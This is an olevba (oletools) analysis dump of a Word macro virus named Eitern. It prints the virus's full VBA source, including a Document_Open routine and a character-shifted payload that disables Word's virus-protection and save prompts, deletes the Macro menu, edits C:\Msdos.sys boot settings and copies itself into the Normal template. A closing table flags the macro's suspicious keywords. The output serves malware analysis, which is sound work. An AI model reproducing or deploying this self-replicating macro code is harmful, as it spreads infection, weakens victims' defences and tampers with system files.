olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Eitern-8f83497e59ff0645c2d2fe0bf9999a6144217769
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Eitern-8f83497e59ff0645c2d2fe0bf9999a6144217769 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Open "C:\Eitern.inf" For Output As #1: Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): Close #1
I = (MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(8, 1))
For X = 2 To Len(I): B$ = Asc(Mid(I, X, 1)) - 1: C$ = C$ & Chr(B$): Next X: A = C$
MacroContainer.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"
MacroContainer.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 8, A
MacroContainer.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 2, 6
'Po!Fssps!Sftvnf!Ofyu;!Pqujpot/DpogjsnDpowfstjpot!>!)1!.!1*;!Pqujpot/TbwfOpsnbmQspnqu!>!)2!.!2*;!Pqujpot/WjsvtQspufdujpo!>!)3!.!3*;!DpnnboeCbst)#Uppmt#*/Dpouspmt)#Nbdsp#*/Efmfuf
Jg!Ebz)2*!Uifo;!TfuBuus!#D;]Ntept/tzt#-!wcOpsnbm;!Tztufn/QsjwbufQspgjmfTusjoh)#D;]Ntept/tzt#-!#Pqujpot#-!#CppuHVJ#*!>!#1#;!TfuBuus!#D;]Ntept/tzt#-!wcTztufn!,!wcIjeefo!,!wcSfbePomz
OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/EfmfufMjoft!2-!OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/DpvouPgMjoft;!BdujwfEpdvnfou/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/EfmfufMjoft!2-!BdujwfEpdvnfou/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/DpvouPgMjoft
OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/BeeGspnGjmf!)#D;]Fjufso/jog#*;!BdujwfEpdvnfou/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/BeeGspnGjmf!)#D;]Fjufso/jog#*;!BdujwfEpdvnfou/TbwfBt!GjmfObnf!>!BdujwfEpdvnfou/GvmmObnf
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Eitern.inf          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

